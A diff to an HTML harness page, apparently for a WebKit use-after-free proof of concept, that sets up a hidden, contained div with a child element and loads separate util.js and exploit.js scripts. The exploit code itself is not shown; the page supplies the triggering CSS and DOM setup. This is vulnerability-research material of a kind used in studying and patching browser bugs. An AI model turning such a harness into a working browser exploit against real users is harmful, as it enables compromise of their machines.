@@ -1,13 +1,26 @@
-
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>SBFX Memory Corruption Test</title>
+  <meta charset="UTF-8">
+  <title>WebKit UAF PoC – Bug #287908</title>
+  <style>
+    .container {
+      content-visibility: hidden;
+      contain: layout style;
+    }
+    .child {
+      width: 100px;
+      height: 100px;
+      background-color: blue;
+    }
+  </style>
 </head>
 <body>
-    <h1>SBFX Memory Corruption Detection</h1>
-    <pre id="log"></pre>
-    <script src="js/exploit.js"></script>
+  <div class="container" id="container">
+    <div class="child" id="child"></div>
+  </div>
+
+  <script src="util.js"></script>
+  <script src="exploit.js"></script>
 </body>
 </html>
